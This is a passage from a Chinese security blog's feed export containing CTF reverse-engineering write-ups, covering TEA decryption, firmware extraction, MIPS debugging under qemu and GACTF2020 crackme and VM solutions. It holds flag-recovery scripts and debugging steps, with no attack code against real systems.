class="keyword">def</span> <span class="title">de_tea</span><span class="params">(a, b, key)</span>:</span></span><br><span class="line">sum = <span class="number">0x86772b40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">b -= (a+sum) ^ ((a&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>]) ^ ((a&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>])</span><br><span class="line">b &amp;= <span class="number">0xffffffff</span></span><br><span class="line">a -= (b+sum) ^ ((b&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>]) ^ ((b&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>])</span><br><span class="line">a &amp;= <span class="number">0xffffffff</span></span><br><span class="line">sum -= <span class="number">0x2433B95A</span></span><br><span class="line">sum &amp;= <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">return</span> [a, b]</span><br><span class="line">   </span><br><span class="line">ans = []</span><br><span class="line">flag2 = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc2), <span class="number">2</span>):</span><br><span class="line">ans += de_tea(enc2[i], enc2[i+<span class="number">1</span>], key[<span class="number">4</span>*(i//<span class="number">2</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">flag2 += long_to_bytes(i)[::<span class="number">-1</span>]</span><br><span class="line">print(flag2)</span><br><span class="line">print(flag1+<span class="string">'f'</span>+flag2.decode())</span><br></pre></td></tr></table></figure><p>最后消息映射表的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span>&#123;</span></span><br><span class="line">    AFX_MSGMAP * pBaseMessageMap;</span><br><span class="line">    AFX_MSGMAP_ENTRY * lpEntries;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span>&#123;</span></span><br><span class="line">    UINT nMessage;    <span class="comment">//Windows Message</span></span><br><span class="line">    UINT nCode        <span class="comment">//Control code or WM_NOTIFY code</span></span><br><span class="line">    UINT nID;         <span class="comment">//control ID (or 0 for windows messages)</span></span><br><span class="line">    UINT nLastID;     <span class="comment">//used for entries specifying a range of control id's</span></span><br><span class="line">    UINT nSig;        <span class="comment">//signature type(action) or pointer to message </span></span><br><span class="line">    AFX_PMSG pfn;     <span class="comment">//routine to call (or specical value)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次打这个比赛，题目都偏难吧。。做了一个arm架构的题，然后UnravelMFC这个题，比赛时学长师傅做了，就没做了，赛后把它复现了下。&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A&lt;/a&gt;&lt;br&gt;提取码：mflo&lt;br&gt;复制这段内容后打开百度网盘手机App，操作更方便哦&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>从一道CTF题简单接触路由器逆向</title>
    <link href="https://www.bxnop.cn/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/"/>
    <id>https://www.bxnop.cn/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/</id>
    <published>2020-10-04T10:03:43.000Z</published>
    <updated>2020-10-04T10:46:04.545Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>关键遇到一个由于Glibc版本变化出现的问题，花了些时间解决。。<a id="more"></a></p></blockquote><p>首先是对路由器文件系统的学习，看了一篇文章，这里直接贴上：<a href="https://www.cnblogs.com/blacksunny/p/7208451.html" target="_blank" rel="noopener">路由器文件系统与提取</a></p><p>然后这个CTF题来自BUU：<strong>firmware</strong></p><p>下载后得到一个bin文件，file一下：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004180937146.png" alt="image-20201004180937146"></p><p>从最上面的文章可以知道这是固件里的bin文件分析。</p><p>首先使用binwalk 提取出，得到一个Squashfs 文件系统的文件：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004181455157.png" alt="image-20201004181455157"></p><p>对于Squashfs 文件系统的文件，我们要使用firmware-mod-kit工具来进行解压。<a href="https://blog.csdn.net/ldwj2016/article/details/80712566" target="_blank" rel="noopener">fiemware-mod-kit工具的安装</a></p><p>遇到的问题来了。跟着安装前置的文件后，在<strong>执行configure文件生成Makefile文件然后make编译生成可执行文件</strong>发生了问题：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182128948.png" alt="image-20201004182128948"></p><p>其实上面的也有很多warning，但都能通过的，找了一篇文章了解原因，<a href="https://blog.csdn.net/baidu_35679960/article/details/78984497" target="_blank" rel="noopener">C语言中函数不声明也能使用</a></p><blockquote><p><strong>在函数声明方面C和C++则不同，C++语言中，在被调用之前未声明或定义是不允许的，而C语言是允许的。</strong></p></blockquote><p>然后就是出现error的原因寻找。。</p><p>最开始没仔细看出错原因，直接把一大段错误google和百度，但发现大家都没有出现这样的问题。。找了很久。。</p><p>然后开始仔细看出错的原因，即上面画红线的语句。最开始对<strong>collect2：error：ld return 1 exit status</strong>进行了搜索。找到解释：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182839147.png" alt="image-20201004182839147"></p><p>意思就是：上面的undefined reference to — 导致出错。而<strong>undefined reference to —</strong> 出错的原因是我们在程序中使用了未定义的函数。</p><p>现在error原因清晰多了，google也更目标化了。然后找到了最终原因：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183233667.png" alt="image-20201004183233667"></p><p>最后找到所有要编译的文件添加上：<strong>#include &lt;sys/sysmacros.h&gt;</strong>即可。</p><p>准备工作完成，开始对Squashfs 文件系统文件解压：</p><p>在firmware/firmware-mod-kit目录下，使用<strong>./unsquashfs_all.sh 需要解压文件的目录</strong>：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183726652.png" alt="image-20201004183726652"></p><p>最后在解压得到文件目录：<strong>squashfs-root/tmp</strong>下得到我们想要的backdoor程序。然后脱壳，找string。</p><p><strong>本文更多的是对自己解决问题一步一步的记录，也是路由器逆向的简单学习。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;关键遇到一个由于Glibc版本变化出现的问题，花了些时间解决。。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>iot&amp;mips程序动调&amp;qemu学习&amp;ghidra</title>
    <link href="https://www.bxnop.cn/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/"/>
    <id>https://www.bxnop.cn/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/</id>
    <published>2020-09-18T14:08:15.000Z</published>
    <updated>2020-09-19T03:34:00.038Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>吾爱师傅发了一篇关于mips程序的逆向，刚接触逆向遇到过但都跳过了，这次遇到正好趁此学习一下。</p></blockquote><a id="more"></a><h2 id="qemu的了解与ghidra"><a href="#qemu的了解与ghidra" class="headerlink" title="qemu的了解与ghidra"></a>qemu的了解与ghidra</h2><p>以该师傅发的iot逆向题目来学习。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919100306144.png" alt="image-20200919100306144">下载后有3个文件，其中一个是提示：</p><blockquote><p><strong>题目运行命令如下:</strong><br><strong>sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append “root=/dev/sda console=tty50”</strong> </p><p><strong>需要分析的程序为 ./bin/maze</strong></p></blockquote><p>了解下qemu：</p><blockquote><p>Qemu  是<strong>纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备</strong>，我们最熟悉的就是能够模拟一台能够独立运行操作系统的虚拟机，虚拟机认为自己和硬件打交道，但其实是和 Qemu 模拟出来的硬件打交道，Qemu 将这些指令转译给真正的硬件。</p></blockquote><p>其实就是qemu可以模拟一些对应程序需要环境来让执行对应的程序。</p><p>经过一番理解后，其实就是使用qemu利用所给的2个文件来模拟openwrt系统来运行，我们知道linux的每个命令都是一个二进制文件，而我们要分析的maze文件也在该命令文件夹中（bin）。</p><p>由于.ext4文件是可以直接解压的，首先将其解压后得到要分析的maze文件。</p><p>查看一下文件信息：32为小端mips的动态链接程序。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919001345047.png" alt="image-20200919001345047"></p><p>执行一下看，发现不能执行，因为这个mips框架的，查资料才知道可以使用qemu来模拟mips环境来执行mips程序。</p><p>题目有提示的，在上面告诉了我们<strong>题目运行命令</strong>：</p><p>所以首先我们是要安装qemu的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br></pre></td></tr></table></figure><p>然后进入该模拟的openwrt系统，简单执行一下maze程序，可以看见，还可以进行gdb调试。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200918235617145.png" alt="image-20200918235617145"></p><p>由于ida7.5以下且不使用<code>retdec</code>插件是不能反编译mips框架程序的，知道可以使用ghidra。下载后，找了一个教程学习了下，<a href="https://bbs.pediy.com/thread-251204.htm" target="_blank" rel="noopener">Ghidra使用</a>，其实和ida也总体差不多，上手会很快，但没有ida那么方便。</p><p>由于以前学习java安装过jdk且配置了环境变量，下载该程序后可以直接使用很方便。载入程序：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919002432181.png" alt="image-20200919002432181"></p><p>文件名都是maze（迷宫），且通过伪代码可以很快看清程序流程，这道题也是maze的老套路了，首先生成一个表，然后通过指定字符（U D L R）控制走向，到达一个目的地。</p><p>这里可以通过伪代码计算出该表，但可以直接通过模拟的openwrt系统gdb调试，就调试好了。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003129670.png" alt="image-20200919003129670"></p><p>然后dump出数据：<strong>dump binary memroy dump.txt 0x4110d0 0x411147</strong><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003201998.png" alt="image-20200919003201998"></p><p>C语言按15*8打印一下：</p><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003349559.png" alt="image-20200919003349559"></p><p>最后走一下得结果：DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003440203.png" alt="image-20200919003440203"></p><h2 id="mips程序的ida动调与gdb调试"><a href="#mips程序的ida动调与gdb调试" class="headerlink" title="mips程序的ida动调与gdb调试"></a>mips程序的ida动调与gdb调试</h2><p>当然到这里肯定是不够的，万一程序没有给能能让该mips程序运行的文件系统，那我们还是自己想办法让程序运行起来进而动调。</p><p>在上面为了模拟openwrt系统运行，已经安装了qemu-user。这时候静态链接的mips程序我们是可以直接执行了，但一般的程序的程序都是动态链接的，我们只要安装好<strong>对应的架构程序的共享库</strong>就好了。<a href="https://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html" target="_blank" rel="noopener">学习安装的文章</a></p><p>首先搜索相关库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search <span class="string">"libc6"</span> | grep mips</span><br></pre></td></tr></table></figure><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919101836969.png" alt="image-20200919101836969"></p><p>这里我们安装程序需要的就行。我为了以后方便将64位与32位的大小端mips程序的共享库都装了：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102119629.png" alt="image-20200919102119629"></p><p>然后运行动态链接的程序要使用完整的命令且指明共享库路径：<strong>-L 指明共享库路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./maze</span><br></pre></td></tr></table></figure><p>但这道题的maze却运行不了，提示：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102554822.png" alt="image-20200919102554822"></p><p>可以看到，他提示/bin/ld-musl-mipsel-sf.so.1不存在。而这是一个绝对路径，而题目给了文件系统的。所以找到之前解压的.ext4文件，果然才/bin/目录下发现ld-musl-mips-sf.so.1。所以这个的mips的程序应该是指定了共享库的路径了，我们安装32位小端共享库自然不行。</p><p>所以本题的程序要利用所给的共享库，接下来把lib文件夹放在与maze同一级的目录下，然后执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./maze</span><br></pre></td></tr></table></figure><p>还是报错。。但这次是共享库存在了。。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919103541134.png" alt="image-20200919103541134"></p><p>最后在看发这个题的师傅的帖子里看到一个方法：也就是我上面执行失败的解决办法。</p><p>找到/lib/下的2个文件：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919104238399.png" alt="image-20200919104238399"></p><p>我的理解是像链表一样通过一个文件找到一个文件。这样会导致我们在所给系统外执行该程序，解析失败。解决办法：</p><p>直接删除原文件，将所指的2个文件，重命名为指向他们文件的名称。<strong>也就是ld-musl-mipsel-sf.so.1删除，libc.so重名为ld-musl-mipsel-sf.so.1，另外一个文件同然的操作。</strong></p><p>然后执行成功。<strong>当然对于直接给的一个mips程序，我们用指定的qemu命令并指明共享库就可以执行的了。要是其他架构的程序使用相应的命令即可</strong></p><p>为了调试，我们指定某一个端口开一个GDB调试（-g port）。</p><p>因为以前ida动调端口号都是23946，这里为了ida动调方便也用这个。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919105704723.png" alt="image-20200919105704723"></p><p>现在我们就可以开始调试了，使用gdb与ida都可以。</p><p>首先gdb：</p><ol><li>安装<strong>apt-get install gdb-multiarch</strong></li><li><strong>gdb-multiarch -q ./bin/maze</strong></li><li><strong>set architecture mips</strong>（设置好调试程序的架构）</li><li><strong>set endian little</strong>（设置程序的大小端）</li><li>远程连接调试端口 <strong>target remote :23946</strong>（本地可以不写ip，127.0.0.1）</li></ol><p>ida：与之前的ida的<strong>Remote linux debugger</strong>类似。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919110620683.png" alt="image-20200919110620683"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;吾爱师傅发了一篇关于mips程序的逆向，刚接触逆向遇到过但都跳过了，这次遇到正好趁此学习一下。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>GACTF2020</title>
    <link href="https://www.bxnop.cn/2020/08/30/GACTF2020/"/>
    <id>https://www.bxnop.cn/2020/08/30/GACTF2020/</id>
    <published>2020-08-30T09:25:54.000Z</published>
    <updated>2020-09-14T11:14:29.231Z</updated>
    
    <content type="html"><![CDATA[<p>做了2个逆向及杂项还是有收获。<a id="more"></a></p><h2 id="Reverse："><a href="#Reverse：" class="headerlink" title="Reverse："></a>Reverse：</h2><h3 id="WannaFlag"><a href="#WannaFlag" class="headerlink" title="WannaFlag"></a>WannaFlag</h3><p>打开程序，炫酷的界面和音乐。其实就是一个CrackeMe。<img src="/2020/08/30/GACTF2020/image-20200913175304433.png" alt="image-20200913175304433"></p><p>载入ida，直接定位到GetwindowText或者GetDlgItemText函数。<img src="/2020/08/30/GACTF2020/image-20200913174317321.png" alt="image-20200913174317321"></p><p>关键就是那个复杂的if语句根本就执行不到，直接跳过。</p><p>对input进行了xor与ror操作。直接逆即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">78</span>, <span class="number">174</span>,  <span class="number">97</span>, <span class="number">186</span>, <span class="number">228</span>,  <span class="number">43</span>,  <span class="number">85</span>, <span class="number">170</span>,  <span class="number">89</span>, <span class="number">252</span>, </span><br><span class="line">   <span class="number">77</span>,   <span class="number">2</span>,  <span class="number">23</span>, <span class="number">107</span>,  <span class="number">19</span>, <span class="number">161</span>,  <span class="number">65</span>, <span class="number">254</span>,  <span class="number">53</span>,  <span class="number">11</span>, </span><br><span class="line">  <span class="number">180</span>,  <span class="number">11</span>,  <span class="number">82</span>,  <span class="number">47</span>,  <span class="number">70</span>, <span class="number">204</span>,  <span class="number">53</span>, <span class="number">130</span>, <span class="number">229</span>, <span class="number">136</span>, </span><br><span class="line">   <span class="number">80</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v37 = <span class="number">6</span>, v38 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i, j, len = <span class="number">31</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ANNAWGALFYBKVIAHMXTFCAACLAAAAYK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; v37; i++)</span><br><span class="line">v38 *= i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i%<span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> ans = ((ida_[i] &gt;&gt; temp) | (ida_[i]&amp;((<span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, temp)<span class="number">-1</span>)) &lt;&lt; <span class="number">8</span>-temp) ^ s[i]; <span class="comment">//rol</span></span><br><span class="line"><span class="built_in">putchar</span>(ans ^ v38);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//wannaflag_is_just_a_paper_tiger</span></span><br></pre></td></tr></table></figure><p>最后将其输入程序的输入框，打开解密后的flag文件得到flag。<img src="/2020/08/30/GACTF2020/image-20200913174837508.png" alt="image-20200913174837508"></p><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>ida打开后，main函数sp-analysis failed，简单修复一下栈指针就行。</p><p><img src="/2020/08/30/GACTF2020/image-20200913182620575.png" alt="image-20200913182620575"></p><p>来到main函数，首先是输入一个整型数据，从交叉引用发现对该数据后面并没有使用，猜测对函数代码有一个解密过程。发现后面有一个<strong>mprotect()</strong>函数修改指定内存保护属性，即把要解密的代码的内存改为可写。接着的函数实现解密一个函数代码功能。</p><p>动调来到解密的函数（这里我也反复修了几次，才完美的F5）：一个VM且前面已经申请了存放数据的内存空间和初始化。<img src="/2020/08/30/GACTF2020/image-20200913183634163.png" alt="image-20200913225646159"></p><p>开始是单步调试，由于分支比较多，后面将整个函数与opcode复制到C语言编译器，打印出函数根据opcode的执行情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">13</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">2029229568</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span 